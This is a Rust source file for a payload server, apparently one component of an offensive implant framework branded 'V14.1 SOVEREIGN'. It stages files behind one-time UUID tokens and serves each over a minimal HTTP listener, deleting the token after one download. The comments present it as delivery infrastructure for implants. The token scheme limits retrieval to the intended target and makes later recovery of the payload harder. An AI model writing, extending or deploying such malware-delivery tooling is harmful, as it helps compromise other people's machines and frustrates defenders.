use anyhow::Result;
use tokio::net::TcpListener;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use std::sync::Arc;
use dashmap::DashMap;
use tracing::{info, error, warn};
use std::path::PathBuf;

/// V14.1 Professional Payload Server
/// Implements One-Time-Token (OTT) delivery for implants.
pub struct PayloadServer {
    tokens: Arc<DashMap<String, PathBuf>>,
}

impl PayloadServer {
    pub fn new() -> Self {
        Self {
            tokens: Arc::new(DashMap::new()),
        }
    }

    /// Stages a payload and returns a unique token/URL path.
    pub fn stage_payload(&self, path: PathBuf) -> String {
        let token = uuid::Uuid::new_v4().to_string();
        self.tokens.insert(token.clone(), path);
        token
    }

    /// Starts the server on a random port and returns the selected port.
    /// The mission is to serve exactly one file per token and then self-destruct that token.
    pub async fn start(self: Arc<Self>) -> Result<u16> {
        let listener = TcpListener::bind("0.0.0.0:0").await?;
        let port = listener.local_addr()?.port();
        
        info!("🚀 V14.1 SOVEREIGN: Payload Server started on port {}", port);

        let tokens = self.tokens.clone();
        tokio::spawn(async move {
            loop {
                match listener.accept().await {
                    Ok((mut socket, addr)) => {
                        info!("📥 V14.1 SOVEREIGN: Payload request from {}", addr);
                        let tokens_inner = tokens.clone();
                        tokio::spawn(async move {
                            if let Err(e) = handle_payload_request(&mut socket, tokens_inner).await {
                                error!("⚠️ Payload Server error: {}", e);
                            }
                        });
                    }
                    Err(e) => error!("⚠️ Payload Server accept error: {}", e),
                }
            }
        });

        Ok(port)
    }
}

async fn handle_payload_request(socket: &mut tokio::net::TcpStream, tokens: Arc<DashMap<String, PathBuf>>) -> Result<()> {
    let mut buffer = [0; 1024];
    let n = socket.read(&mut buffer).await?;
    let request = String::from_utf8_lossy(&buffer[..n]);
    
    // Simple HTTP GET parser
    let path = request.lines().next().unwrap_or("").split_whitespace().nth(1).unwrap_or("");
    let token = path.trim_start_matches('/');

    if let Some((_, file_path)) = tokens.remove(token) {
        info!("🔥 V14.1 SOVEREIGN: OTT Token used. Serving payload: {:?}", file_path);
        
        let mut file = tokio::fs::File::open(file_path).await?;
        let mut content = Vec::new();
        file.read_to_end(&mut content).await?;

        let response = format!(
            "HTTP/1.1 200 OK\r\n\
             Content-Type: application/octet-stream\r\n\
             Content-Length: {}\r\n\
             Connection: close\r\n\
             \r\n",
            content.len()
        );

        socket.write_all(response.as_bytes()).await?;
        socket.write_all(&content).await?;
    } else {
        warn!("🚫 V14.1 SOVEREIGN: Invalid or expired OTT token requested: {}", token);
        let response = "HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n";
        socket.write_all(response.as_bytes()).await?;
    }
    
    socket.flush().await?;
    Ok(())
}
